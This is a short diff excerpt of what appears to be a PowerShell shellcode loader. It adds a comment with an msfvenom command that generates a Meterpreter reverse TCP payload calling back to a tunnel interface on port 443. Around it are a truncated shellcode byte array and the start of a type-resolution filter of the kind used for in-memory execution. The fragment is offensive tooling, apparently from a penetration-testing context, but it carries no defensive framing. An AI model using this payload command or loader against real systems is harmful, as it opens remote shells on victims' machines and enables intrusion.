@@ -1,3 +1,4 @@
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread
 [Byte[]] $SHELLCODE = 0xff, ...
 
 filter Get-Type ([string]$dllName,[string]$typeName)
